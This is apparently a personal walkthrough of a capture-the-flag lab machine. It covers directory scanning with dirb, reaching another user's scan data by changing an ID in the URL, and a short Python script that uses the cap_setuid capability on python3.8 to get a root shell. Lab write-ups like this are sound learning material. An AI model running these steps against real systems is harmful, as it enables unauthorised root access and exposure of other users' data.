Task 2:

After running a "Security Snapshot", the browser is redirected to a path of the format /[something]/[id], where [id] represents the id number of the scan. What is the [something]?

Before doing this, since port 80 is open, I ran the usual directory scanning:

└─$ dirb http://10.129.17.59/ /usr/share/wordlists/dirb/small.txt

This actually gave the answer to the task as well:

+ http://10.129.17.59/data (CODE:302|SIZE:208)
+ http://10.129.17.59/netstat (CODE:200|SIZE:27269)

which is the same as http://10.129.17.59/data/1

Task 3:

Are you able to get to other users' scans?

http://10.129.17.59/data/2 does not lead to anything, but http://10.129.17.59/data/0 does.

What is the full path to the binary on this machine has special capabilities that can be abused to obtain root privileges?

The first thing that caught my eye was cap_setuid. I think I could change user id to 0, which would be root.

After I confirmed that it could be done (Potential Privilege Escalation via Python cap_setuid)

I tried using setuid in a python script from Python | os.getuid() and os.setuid() method, but to no success

nathan@cap:~$ python3 test.py
Real user ID of the current process: 1001
Real user ID changed
Real user ID of the current process: 0
nathan@cap:~$ sudo -l
Sorry, user nathan may not run sudo on cap.

In the end, I wanted to confirm that I am on the right track, so I test if it was the correct path.

And it was: /usr/bin/python3.8

However, it was much simpler. This article helped me: Linux Privilege Escalation via cap_setuid gaining root with Python

The code simply looks like this:

import os
os.setuid(0)
os.system('whoami')
os.system('sh')
nathan@cap:~$ nano test.py
nathan@cap:~$ python3 test.py
root
# whoami
root

Submit the flag located in root's home directory.

/root/root.txt
